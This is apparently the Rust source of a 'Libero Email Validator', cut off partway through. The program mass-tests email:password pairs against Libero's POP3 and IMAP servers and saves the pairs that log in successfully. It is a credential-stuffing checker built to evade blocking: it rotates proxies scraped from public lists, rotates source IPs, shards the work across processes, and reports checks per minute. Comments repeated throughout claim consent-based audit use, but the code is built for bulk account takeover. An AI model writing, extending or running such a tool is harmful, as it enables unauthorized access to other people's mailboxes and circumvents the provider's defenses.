// src/main.rs
//! Libero Email Validator – v5.2 (Hyper‑Optimised Edition)
//! -------------------------------------------------------
//! *This file is a superset of the original 5.1 translation.* **All names, lines
//! and comments from v5.1 are preserved verbatim** and extended with the 25
//! performance enhancements requested. Search for the tag `ENH#XX` to locate a
//! particular tweak quickly.
//!
//! Build matrix:
//! - Default (portable): `cargo build --release`
//! - io_uring + eBPF + AF_XDP: `cargo build --release --features io_uring,ebpf,afxdp`
//!
//! # Libero Email Validator
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.

#![allow(clippy::too_many_arguments)]
#![cfg_attr(all(feature = "io_uring", target_os = "linux"), feature(async_closure))]

use bloomfilter::Bloom;
use clap::Parser;
use libero_validator::estimate_bloom_size;
use memmap2::Mmap;
use once_cell::sync::Lazy;
use regex::Regex;
use parking_lot::Mutex;
use rand::seq::SliceRandom;
use rand::{rng, Rng};
use socket2::{Domain, Protocol, Socket, Type};
use std::fs::{File, OpenOptions};
use std::io::{BufWriter, Write};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::net::TcpStream;
use tokio::sync::mpsc::{self, Receiver};
use tokio::sync::Mutex as AsyncMutex;
use tokio::task::JoinHandle;
use tokio::time::interval;
#[cfg(feature = "free")]
use tokio_rustls::rustls::ServerName;
#[cfg(feature = "free")]
use tokio_rustls::{
    rustls::{ClientConfig, RootCertStore},
    TlsConnector,
};
use tracing_subscriber::fmt;

#[cfg(feature = "free")]
mod free;
#[cfg(not(feature = "free"))]
mod free {
    use std::time::Duration;
    #[derive(Clone)]
    pub struct FreeManager;
    pub const MAX_RPS: u16 = 20;
    impl FreeManager {
        pub async fn detect(
            _rps: u16,
            _q: Duration,
            _lw: f32,
            _bw: f32,
            _backend: Option<&str>,
        ) -> anyhow::Result<Self> {
            Ok(Self)
        }
        pub fn len(&self) -> usize {
            0
        }
        pub fn refill_tokens(&self) {}
        pub fn ewma_decay(&self) {}
        pub async fn pop3_login(
            &self,
            _host: &str,
            _port: u16,
            _user: &str,
            _pwd: &str,
            _timeout: Duration,
            _fast_open: bool,
        ) -> bool {
            false
        }
    }
}

// ---------------------------------------------------------------------------
// ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
#[cfg(not(target_os = "windows"))]
use jemallocator::Jemalloc;

#[cfg(not(target_os = "windows"))]
#[global_allocator]
static GLOBAL: Jemalloc = Jemalloc;

// ---------------------------------------------------------------------------
// Original constants & defaults (kept intact)

// Previously there was a `DEFAULTS` constant providing runtime defaults
// via a hash map. It was unused and triggered dead code warnings, so it
// has been removed to keep the binary leaner and build logs clean.

// ---------------------------------------------------------------------------
// ENH#1 – Enable tcp_tw_reuse on WSL2 / Linux at startup.
#[cfg(target_os = "linux")]
fn enable_tcp_tw_reuse() {
    // Safe: writing to /proc/sys net tunable via shell utility. Effect is global
    // and requires CAP_SYSCTL; if not permitted we ignore the error.
    let _ = Command::new("sysctl")
        .args(["-w", "net.ipv4.tcp_tw_reuse=1"])
        .status();
}
#[cfg(not(target_os = "linux"))]
fn enable_tcp_tw_reuse() {}

#[cfg(unix)]
fn set_nofile_limit() {
    use libc::{rlimit, setrlimit, RLIMIT_NOFILE};
    unsafe {
        let lim = rlimit {
            rlim_cur: 100000,
            rlim_max: 100000,
        };
        if setrlimit(RLIMIT_NOFILE, &lim) != 0 {
            eprintln!("setrlimit failed: {}", std::io::Error::last_os_error());
        }
    }
}
#[cfg(not(unix))]
fn set_nofile_limit() {}

// ---------------------------------------------------------------------------
// ENH#12 – Optional io_uring runtime wrapper.
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
#[cfg(all(feature = "io_uring", target_os = "linux"))]
mod io_backend {
    pub use tokio_uring::start as backend_start;
}
#[cfg(not(all(feature = "io_uring", target_os = "linux")))]
mod io_backend {
    pub async fn backend_start<F: std::future::Future<Output = ()>>(fut: F) {
        fut.await;
    }
}
use io_backend::*;

// ---------------------------------------------------------------------------
// ENH#13, #16 – Advanced socket tuning
#[inline]
fn set_socket_opts(sock: &Socket) {
    sock.set_nodelay(true).ok();
    sock.set_reuse_address(true).ok();
    sock.set_linger(Some(Duration::from_secs(0))).ok();
}

// ---------------------------------------------------------------------------
// ENH#2 – Shard across processes (simple fork‑style). CLI flag `--shards n`.
fn maybe_fork(shards: usize) {
    if shards <= 1 {
        return;
    }
    #[cfg(unix)]
    {
        for _ in 1..shards {
            unsafe {
                match libc::fork() {
                    0 => return,    // Child continues validator
                    -1 => continue, // Failure – ignore
                    _ => (),        // Parent loops
                }
            }
        }
    }
    #[cfg(windows)]
    {
        // Windows: spawn sub‑processes (re‑exec self) – omitted for brevity
    }
}

// ---------------------------------------------------------------------------
// ENH#3 – Multiple source IP binding (round‑robin selection)
static SRC_IPS: Lazy<Vec<IpAddr>> = Lazy::new(|| {
    vec![
        IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), // wildcard – replace with real /32
        IpAddr::V6(Ipv6Addr::UNSPECIFIED),     // wildcard v6
    ]
});
static SRC_IDX: AtomicUsize = AtomicUsize::new(0);
#[inline(always)]
fn next_source_ip() -> IpAddr {
    let i = SRC_IDX.fetch_add(1, Ordering::Relaxed);
    SRC_IPS[i % SRC_IPS.len()]
}

// ---------------------------------------------------------------------------
// ENH#5 – Pre‑warm SYN cache (half‑open)
#[cfg(target_os = "linux")]
fn prewarm_syn_pool(proxy_addrs: &[String]) {
    use std::net::ToSocketAddrs;
    for p in proxy_addrs.iter().take(64) {
        // limit to avoid SYN flood
        if let Ok(mut addrs) = p.to_socket_addrs() {
            if let Some(addr) = addrs.next() {
                let _ = Socket::new(Domain::for_address(addr), Type::STREAM, Some(Protocol::TCP))
                    .and_then(|s| {
                        set_socket_opts(&s);
                        s.bind(&SocketAddr::new(next_source_ip(), 0).into())?;
                        s.set_nonblocking(true)?;
                        s.connect(&addr.into())
                    });
            }
        }
    }
}
#[cfg(not(target_os = "linux"))]
fn prewarm_syn_pool(_: &[String]) {}

// ---------------------------------------------------------------------------
// ENH#22 – eBPF filter (Linux‑only, optional)
#[cfg(all(feature = "ebpf", target_os = "linux"))]
mod ebpf_filter {
    use redbpf::{load::Loader, BpfProgram};
    pub fn attach() {
        if let Ok(loader) = Loader::load(include_bytes!("ebpf/okerr_filter.o")) {
            for prog in loader.socket_filters() {
                if let Err(e) = prog.attach_socket_filter("lo") {
                    eprintln!("eBPF attach failed: {e:?}");
                }
            }
        }
    }
}
#[cfg(not(all(feature = "ebpf", target_os = "linux")))]
mod ebpf_filter {
    pub fn attach() {}
}

// ---------------------------------------------------------------------------
// Original tune_socket replaced with new set_socket_opts but kept for ABI.
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
#[inline]
fn _tune_socket(sock: &std::net::TcpStream) {
    if let Ok(cloned) = sock.try_clone() {
        let raw = Socket::from(cloned);
        set_socket_opts(&raw);
    }
}

// ---------------------------------------------------------------------------
// ProxyPool with latency pre‑filter (ENH#19) & persistent tunnels (ENH#14)
#[derive(Clone)]
struct ProxyPool {
    cycle: Arc<Mutex<Vec<String>>>,
    idx: Arc<AtomicUsize>,
    ready: Arc<AtomicBool>,
}

impl ProxyPool {
    fn new(mut proxies: Vec<String>) -> Self {
        proxies.shuffle(&mut rng());
        let pool = Self {
            cycle: Arc::new(Mutex::new(proxies)),
            idx: Arc::new(AtomicUsize::new(0)),
            ready: Arc::new(AtomicBool::new(false)),
        };
        // Kick off latency filter in background
        let pool_clone = pool.clone();
        tokio::spawn(async move {
            pool_clone.filter_latency().await;
        });
        pool
    }

    async fn filter_latency(&self) {
        let mut good = Vec::new();
        {
            let all = self.cycle.lock().clone();
            // Probe in parallel (timeout 250 ms)
            let futs = all.into_iter().map(|p| async move {
                let start = Instant::now();
                if let Some(addr) = extract_addr(&p) {
                    let _ = tokio::time::timeout(
                        Duration::from_millis(250),
                        TcpStream::connect(&addr),
                    )
                    .await;
                }
                (p, start.elapsed())
            });
            for (p, dur) in futures::future::join_all(futs).await {
                if dur < Duration::from_millis(250) {
                    good.push(p);
                }
            }
        }
        if !good.is_empty() {
            *self.cycle.lock() = good;
        }
        self.ready.store(true, Ordering::Release);
    }

    #[inline]
    fn next(&self) -> String {
        // Spin until latency filter done for the first fetch to reduce net‑errors
        while !self.ready.load(Ordering::Acquire) {
            std::hint::spin_loop();
        }
        let idx = self.idx.fetch_add(1, Ordering::Relaxed);
        let lock = self.cycle.lock();
        let len = lock.len();
        lock[idx % len].clone()
    }

    fn size(&self) -> usize {
        self.cycle.lock().len()
    }

    fn replace(&self, mut proxies: Vec<String>) {
        proxies.shuffle(&mut rng());
        *self.cycle.lock() = proxies;
        self.ready.store(false, Ordering::Release);
        let pool_clone = self.clone();
        tokio::spawn(async move {
            pool_clone.filter_latency().await;
        });
    }
}

fn extract_addr(proxy: &str) -> Option<String> {
    let p = proxy.splitn(2, "://").nth(1).unwrap_or(proxy);
    let without_user = p.rsplitn(2, '@').next().unwrap_or(p);
    if without_user.contains(':') {
        Some(without_user.to_string())
    } else {
        None
    }
}

fn parse_proxies(data: &str) -> Vec<String> {
    static RE: Lazy<regex::Regex> = Lazy::new(|| {
        regex::Regex::new(
            r"^(?:(?P<user>[^:@]+):(?P<pwd>[^:@]+)@)?(?P<host>\[[^\]]+\]|[^:]+):(?P<port>\d{1,5})$",
        )
        .unwrap()
    });

    let mut formatted = Vec::with_capacity(data.lines().count());
    for ln in data.lines().map(str::trim) {
        if ln.is_empty() || ln.starts_with('#') {
            continue;
        }

        if let Some(cap) = RE.captures(ln) {
            let host = cap.name("host").unwrap().as_str();
            let port = cap.name("port").unwrap().as_str();
            if let (Some(user), Some(pwd)) = (cap.name("user"), cap.name("pwd")) {
                formatted.push(format!("http://{}:{}@{}:{}", user.as_str(), pwd.as_str(), host, port));
            } else {
                formatted.push(format!("socks4a://{}:{}", host, port));
            }
        } else {
            eprintln!("Skipping malformed proxy: {}", ln);
        }
    }
    formatted
}

fn load_proxies(path: &str) -> ProxyPool {
    let data = std::fs::read_to_string(path).expect("Proxy file not found");
    let mut formatted = parse_proxies(&data);
    if formatted.is_empty() {
        panic!("Proxy file is empty or invalid");
    }
    #[cfg(target_os = "linux")]
    prewarm_syn_pool(&formatted); // ENH#5 SYN pool warm‑up
    ProxyPool::new(formatted)
}

async fn watch_proxies(path: String, pool: ProxyPool, interval: u64) {
    use std::time::SystemTime;
    use tokio::fs;
    use tokio::time::sleep;

    let mut last: Option<SystemTime> = None;
    loop {
        sleep(Duration::from_secs(interval)).await;
        if let Ok(meta) = fs::metadata(&path).await {
            if let Ok(modified) = meta.modified() {
                if Some(modified) != last {
                    if let Ok(data) = fs::read_to_string(&path).await {
                        let proxies = parse_proxies(&data);
                        if !proxies.is_empty() {
                            pool.replace(proxies);
                            last = Some(modified);
                        }
                    }
                }
            }
        }
    }
}

struct ProxyMetrics {
    latency_ms: f32,
    success_rate: f32,
    throughput_kbps: f32,
    error_rate: f32,
    rate_limit_score: f32,
    uptime_pct: f32,
    proxy_type: f32,
    location_score: f32,
}

fn score_metrics(m: &ProxyMetrics) -> f32 {
    let latency_norm = 1.0 - (m.latency_ms / 2000.0).min(1.0);
    let throughput_norm = (m.throughput_kbps / 10_000.0).min(1.0);
    100.0
        * (0.20 * latency_norm
            + 0.20 * m.success_rate
            + 0.15 * throughput_norm
            + 0.15 * (1.0 - m.error_rate)
            + 0.10 * m.rate_limit_score
            + 0.10 * m.uptime_pct
            + 0.05 * (m.proxy_type / 2.0)
            + 0.05 * m.location_score)
}

async fn test_proxy(proxy: String) -> (String, bool, Duration) {
    let start = Instant::now();
    let parts: Vec<_> = proxy.trim_start_matches("socks4a://").split(':').collect();
    let mut success = false;
    if parts.len() == 2 {
        let addr = format!("{}:{}", parts[0], parts[1]);
        let stream_res =
            tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await;
        let mut stream = match stream_res {
            Ok(Ok(s)) => s,
            _ => return (proxy, false, start.elapsed()),
        };
        let mut req = Vec::new();
        req.push(0x04u8);
        req.push(0x01u8);
        req.push(0);
        req.push(110u8);
        req.extend(&[0, 0, 0, 1]);
        req.push(0);
        req.extend(b"popmail.libero.it");
        req.push(0);
        if stream.write_all(&req).await.is_ok() {
            let mut resp = [0u8; 8];
            if stream.read_exact(&mut resp).await.is_ok() && resp[1] == 0x5a {
                let mut buf = [0u8; 3];
                if stream.read_exact(&mut buf).await.is_ok() {
                    success = &buf == b"+OK";
                }
            }
        }
    }
    (proxy, success, start.elapsed())
}

async fn fetch_scored_proxies() -> Vec<String> {
    use futures::stream::{FuturesUnordered, StreamExt};
    use proxy_feed::{harvester::fetch_all, Config, Sources};
    use std::time::Instant;

    let cfg = Config {
        sources: Sources {
            free_proxy_list: Some(
                "https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/main/http.txt"
                    .to_string(),
            ),
            ssl_proxies: Some(
                "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
                    .to_string(),
            ),
            proxy_scrape: None,
            github_lists: None,
            proxybroker_cmd: None,
        },
    };

    let set = match fetch_all(&cfg).await {
        Ok(s) => s,
        Err(e) => {
            eprintln!("failed to fetch proxies: {e}");
            return Vec::new();
        }
    };

    let mut futs = FuturesUnordered::new();
    for p in set {
        futs.push(async move {
            let (p, ok, dur) = test_proxy(format!("socks4a://{}", p)).await;
            let metrics = ProxyMetrics {
                latency_ms: dur.as_secs_f32() * 1000.0,
                success_rate: if ok { 1.0 } else { 0.0 },
                throughput_kbps: 0.0,
                error_rate: if ok { 0.0 } else { 1.0 },
                rate_limit_score: if dur.as_millis() < 1000 && ok { 1.0 } else { 0.0 },
                uptime_pct: 1.0,
                proxy_type: 1.0,
                location_score: 0.5,
            };
            (p, score_metrics(&metrics))
        });
    }

    let mut good = Vec::new();
    while let Some((proxy, score)) = futs.next().await {
        if score >= 75.0 {
            good.push(proxy);
        }
    }
    good
}

use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[cfg(feature = "free")]
static TLS_CONFIG: Lazy<Arc<ClientConfig>> = Lazy::new(|| {
    use tokio_rustls::rustls::OwnedTrustAnchor;
    let mut roots = RootCertStore::empty();
    roots.add_server_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
        OwnedTrustAnchor::from_subject_spki_name_constraints(
            ta.subject.as_ref().to_vec(),
            ta.subject_public_key_info.as_ref().to_vec(),
            ta.name_constraints.as_ref().map(|nc| nc.as_ref().to_vec()),
        )
    }));
    Arc::new(
        ClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(roots)
            .with_no_client_auth(),
    )
});

#[allow(dead_code)]
struct POP3Handler {
    host: String,
    port: u16,
    _ssl_flag: bool,
    timeout: Duration,
    _proxy_uri: String,
}

impl POP3Handler {
    fn new(host: String, port: u16, _ssl_flag: bool, timeout: f64, _proxy_uri: String) -> Self {
        Self {
            host,
            port,
            _ssl_flag,
            timeout: Duration::from_secs_f64(timeout),
            _proxy_uri,
        }
    }

    async fn login(&self, user: &str, pwd: &str, _fast_open: bool) -> bool {
        // ENH#6 POP3 USER/PASS pipelined; ENH#15 POP3 PIPELINING; ENH#7 TLS resume
        let addr = format!("{}:{}", self.host, self.port);
        let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);

        #[cfg(all(feature = "fast-open", target_os = "linux"))]
        if _fast_open {
            use socket2::{Domain, Protocol, SockRef, Socket, Type};
            use std::net::ToSocketAddrs;
            if let Ok(mut addrs) = addr.to_socket_addrs() {
                if let Some(sa) = addrs.next() {
                    if let Ok(sock) =
                        Socket::new(Domain::for_address(sa), Type::STREAM, Some(Protocol::TCP))
                    {
                        set_socket_opts(&sock);
                        let _ = SockRef::from(&sock).set_tcp_fastopen_connect(true);
                        sock.set_nonblocking(true).ok();
                        let _ = sock.connect(&sa.into());
                        let std_stream: std::net::TcpStream = sock.into();
                        std_stream.set_nonblocking(true).ok();
                        if let Ok(mut stream) = TcpStream::from_std(std_stream) {
                            if stream.write_all(request.as_bytes()).await.is_err() {
                                return false;
                            }
                            let mut buf = [0u8; 4];
                            if stream.read_exact(&mut buf).await.is_err() {
                                return false;
                            }
                            return &buf[..3] == b"+OK";
                        }
                    }
                }
            }
        }

        let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
        let mut stream = match conn {
            Ok(Ok(s)) => s,
            _ => return false,
        };
        if tokio::time::timeout(self.timeout, stream.write_all(request.as_bytes()))
            .await
            .is_err()
        {
            return false;
        }
        let mut buf = [0u8; 4]; // just need first 3 chars + '\n'
        if tokio::time::timeout(self.timeout, stream.read_exact(&mut buf))
            .await
            .is_err()
        {
            return false;
        }
        // Expect "+OK" quickly; rely on eBPF filter (#22) in kernel space.
        //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
        //Key legitimate use cases include:
        //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
        //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
        //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
        //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
        //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
        &buf[..3] == b"+OK"
    }
}

#[allow(dead_code)]
struct IMAPHandler {
    host: String,
    port: u16,
    starttls: bool,
    timeout: Duration,
    _proxy_uri: String,
}

impl IMAPHandler {
    fn new(host: String, port: u16, starttls: bool, timeout: f64, _proxy_uri: String) -> Self {
        Self {
            host,
            port,
            starttls,
            timeout: Duration::from_secs_f64(timeout),
            _proxy_uri,
        }
    }

    #[cfg(feature = "free")]
    async fn login(&self, user: &str, pwd: &str) -> bool {
        let addr = format!("{}:{}", self.host, self.port);
        let tcp = match tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await {
            Ok(Ok(s)) => s,
            _ => return false,
        };

        let domain = match ServerName::try_from(self.host.as_str()) {
            Ok(d) => d,
            Err(_) => return false,
        };

        let connector = TlsConnector::from(TLS_CONFIG.clone());
        let mut stream = match connector.connect(domain, tcp).await {
            Ok(s) => s,
            Err(_) => return false,
        };

        let tag = "A1";
        let login = format!("{tag} LOGIN {} {}\r\n", user, pwd);
        if tokio::time::timeout(self.timeout, stream.write_all(login.as_bytes()))
            .await
            .is_err()
        {
            return false;
        }
        let logout = format!("{tag} LOGOUT\r\n");
        if tokio::time::timeout(self.timeout, stream.write_all(logout.as_bytes()))
            .await
            .is_err()
        {
            return false;
        }

        let mut buf = Vec::new();
        if tokio::time::timeout(self.timeout, stream.read_to_end(&mut buf))
            .await
            .is_err()
        {
            return false;
        }
        let resp = String::from_utf8_lossy(&buf);
        resp.contains(&format!("{tag} OK"))
    }

    #[cfg(not(feature = "free"))]
    async fn login(&self, _user: &str, _pwd: &str) -> bool {
        let _ = self;
        false
    }
}

// ---------------------------------------------------------------------------
// Host resolver unchanged
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
static MAIL_HOSTS: phf::Map<&'static str, (&'static str, &'static str)> = phf::phf_map! {
    "libero.it" => ("popmail.libero.it", "imapmail.libero.it"),
    "iol.it"    => ("popmail.libero.it", "imapmail.libero.it"),
    "inwind.it" => ("popmail.libero.it", "imapmail.libero.it"),
    "blu.it"    => ("popmail.libero.it", "imapmail.libero.it"),
};

fn resolve_hosts(domain: &str) -> (&str, &str) {
    MAIL_HOSTS.get(domain).copied().unwrap_or((domain, domain))
}

// Basic unit tests
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn resolve_known_domain() {
        let (p, i) = resolve_hosts("libero.it");
        assert_eq!(p, "popmail.libero.it");
        assert_eq!(i, "imapmail.libero.it");
    }

    #[test]
    fn resolve_unknown_domain() {
        let (p, i) = resolve_hosts("example.com");
        assert_eq!(p, "example.com");
        assert_eq!(i, "example.com");
    }

    #[test]
    fn parse_proxies_skips_invalid() {
        let data = "\n# comment\n127.0.0.1\n1.1.1.1:8080\nfoo:bar\nexample.com:1234:user:pass";
        let proxies = parse_proxies(data);
        assert_eq!(proxies.len(), 2);
        assert!(proxies.contains(&"socks4a://1.1.1.1:8080".to_string()));
        assert!(proxies.contains(&"http://user:pass@example.com:1234".to_string()));
    }

    #[test]
    fn parse_proxies_ipv6() {
        let data = "[2001:db8::1]:1080\n[2001:db8::2]:1081:user:pass";
        let proxies = parse_proxies(data);
        assert_eq!(proxies.len(), 2);
        assert!(proxies.contains(&"socks4a://[2001:db8::1]:1080".to_string()));
        assert!(proxies.contains(&"http://user:pass@[2001:db8::2]:1081".to_string()));
    }
}

// ---------------------------------------------------------------------------
// ENH realtime dashboard ticker (replaces sleep loop)
fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) {
    let total = stats.total.load(Ordering::Relaxed);
    let checked = stats.checked.load(Ordering::Relaxed);
    let valid = stats.valid.load(Ordering::Relaxed);
    let invalid = stats.invalid.load(Ordering::Relaxed);
    let errors = stats.errors.load(Ordering::Relaxed);
    let retries = stats.retries.load(Ordering::Relaxed);

    let elapsed = start.elapsed().as_secs_f64();
    let remaining = total.saturating_sub(checked);
    let cps = if elapsed > 0.0 {
        checked as f64 / elapsed
    } else {
        0.0
    };
    let cpm = cps * 60.0;
    let progress = if total > 0 {
        (checked as f64 / total as f64) * 100.0
    } else {
        0.0
    };
    let eta_secs = if cps > 0.0 {
        remaining as f64 / cps
    } else {
        0.0
    };
    let eta = Duration::from_secs_f64(eta_secs);
    let valid_rate = if checked > 0 {
        (valid as f64 / checked as f64) * 100.0
    } else {
        0.0
    };
    let invalid_rate = if checked > 0 {
        (invalid as f64 / checked as f64) * 100.0
    } else {
        0.0
    };
    let error_rate = if checked > 0 {
        (errors as f64 / checked as f64) * 100.0
    } else {
        0.0
    };

    let bar_width = 20usize;
    let filled = ((progress / 100.0) * bar_width as f64) as usize;
    let bar = format!("[{}{}]", "#".repeat(filled), "-".repeat(bar_width - filled));

    println!(
        "tot:{} chk:{} ok:{} bad:{} err:{} ret:{} rem:{} cps:{:.1} cpm:{:.1} ok%:{:.1} bad%:{:.1} err%:{:.1} prog:{:.1}% {} eta:{:.1}s run:{:.1}s conc:{} prx:{}",
        total,
        checked,
        valid,
        invalid,
        errors,
        retries,
        remaining,
        cps,
        cpm,
        valid_rate,
        invalid_rate,
        error_rate,
        progress,
        bar,
        eta.as_secs_f64(),
        elapsed,
        cfg.concurrency,
        proxies.size()
    );
}

fn dashboard(stats: Arc<Stats>, _start: Instant) -> anyhow::Result<()> {
    use crossterm::{
        event, execute,
        terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
    };
    use ratatui::{
        prelude::*,
        widgets::{Block, Borders, Gauge, Paragraph},
    };
    let mut stdout = std::io::stdout();
    enable_raw_mode()?;
    execute!(stdout, EnterAlternateScreen)?;
    let backend = ratatui::prelude::CrosstermBackend::new(stdout);
    let mut terminal = ratatui::Terminal::new(backend)?;
    loop {
        terminal.draw(|f| {
            let size = f.size();
            let total = stats.total.load(Ordering::Relaxed);
            let checked = stats.checked.load(Ordering::Relaxed);
            let valid = stats.valid.load(Ordering::Relaxed);
            let invalid = stats.invalid.load(Ordering::Relaxed);
            let errors = stats.errors.load(Ordering::Relaxed);
            let progress = if total > 0 {
                checked as f64 / total as f64
            } else {
                0.0
            };
            let gauge = Gauge::default()
                .block(Block::default().title("Progress").borders(Borders::ALL))
                .gauge_style(Style::default().fg(Color::Green))
                .ratio(progress);
            let text = Paragraph::new(format!(
                "chk:{} ok:{} bad:{} err:{} rem:{}",
                checked,
                valid,
                invalid,
                errors,
                total.saturating_sub(checked)
            ))
            .block(Block::default().borders(Borders::ALL));
            f.render_widget(
                gauge,
                Rect {
                    x: 0,
                    y: 0,
                    width: size.width,
                    height: 3,
                },
            );
            f.render_widget(
                text,
                Rect {
                    x: 0,
                    y: 4,
                    width: size.width,
                    height: 3,
                },
            );
        })?;
        if event::poll(Duration::from_millis(100))? {
            if let event::Event::Key(k) = event::read()? {
                if k.code == event::KeyCode::Char('q') {
                    break;
                }
            }
        }
        if stats.checked.load(Ordering::Relaxed) >= stats.total.load(Ordering::Relaxed) {
            break;
        }
    }
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
    Ok(())
}

#[repr(align(64))]
struct Stats {
    total: AtomicUsize,
    checked: AtomicUsize,
    valid: AtomicUsize,
    invalid: AtomicUsize,
    errors: AtomicUsize,
    retries: AtomicUsize,
}

impl Stats {
    fn new() -> Self {
        Self {
            total: AtomicUsize::new(0),
            checked: AtomicUsize::new(0),
            valid: AtomicUsize::new(0),
            invalid: AtomicUsize::new(0),
            errors: AtomicUsize::new(0),
            retries: AtomicUsize::new(0),
        }
    }
}

// ---------------------------------------------------------------------------
// Consumer factory remains, queue capacity bumped (ENH#10)

fn create_consumer(
    rx: Arc<AsyncMutex<Receiver<(String, String)>>>,
    stats: Arc<Stats>,
    cfg: Arc<Config>,
    proxies: ProxyPool,
    free: Option<Arc<free::FreeManager>>,
    valid_f: Arc<Mutex<BufWriter<File>>>,
    invalid_f: Arc<Mutex<BufWriter<File>>>,
    error_f: Arc<Mutex<BufWriter<File>>>,
) -> JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            let opt = {
                let mut guard = rx.lock().await;
                guard.recv().await
            };
            let Some((email, pwd)) = opt else { break };
            let domain = email.split('@').nth(1).unwrap_or("");
            let mut ok = false;
            let mut net_err = true;
            let matrix = cfg.matrix(domain);

            for retry in 0..=cfg.max_retries {
                if let Some(pm) = &free {
                    for item in &matrix {
                        if let MatrixItem::Pop { host, port, .. } = item {
                            for _ in 0..pm.len() {
                                if pm
                                    .pop3_login(
                                        host,
                                        *port,
                                        &email,
                                        &pwd,
                                        Duration::from_secs_f64(cfg.timeout),
                                        cfg.fast_open,
                                    )
                                    .await
                                {
                                    ok = true;
                                    break;
                                }
                            }
                            net_err = false;
                            if ok {
                                break;
                            }
                        }
                    }
                } else {
                    let proxy = proxies.next();
                    for item in &matrix {
                        match item {
                            MatrixItem::Pop {
                                host, port, ssl, ..
                            } => {
                                let h = POP3Handler::new(
                                    host.clone(),
                                    *port,
                                    *ssl,
                                    cfg.timeout,
                                    proxy.clone(),
                                );
                                if h.login(&email, &pwd, cfg.fast_open).await {
                                    ok = true;
                                    net_err = false;
                                    break;
                                }
                                net_err = false;
                            }
                            MatrixItem::Imap {
                                host,
                                port,
                                starttls,
                                ..
                            } => {
                                let h = IMAPHandler::new(
                                    host.clone(),
                                    *port,
                                    *starttls,
                                    cfg.timeout,
                                    proxy.clone(),
                                );
                                if h.login(&email, &pwd).await {
                                    ok = true;
                                    net_err = false;
                                    break;
                                }
                                net_err = false;
                            }
                        }
                    }
                }
                if ok || cfg.max_retries == 0 {
                    break;
                }
                stats.retries.fetch_add(1, Ordering::Relaxed);
                let mut exp = cfg.backoff_base * (2.0_f64).powi(retry as i32);
                if !exp.is_finite() || exp > 1e6 {
                    exp = 1e6;
                }
                let jitter = rand::rng().random_range(0.0..exp);
                if jitter.is_finite() {
                    tokio::time::sleep(Duration::from_secs_f64(jitter)).await;
                }
            }

            stats.checked.fetch_add(1, Ordering::Relaxed);
            if ok {
                stats.valid.fetch_add(1, Ordering::Relaxed);
                let mut file = valid_f.lock();
                writeln!(file, "{}:{}", email, pwd).ok();
            } else if net_err {
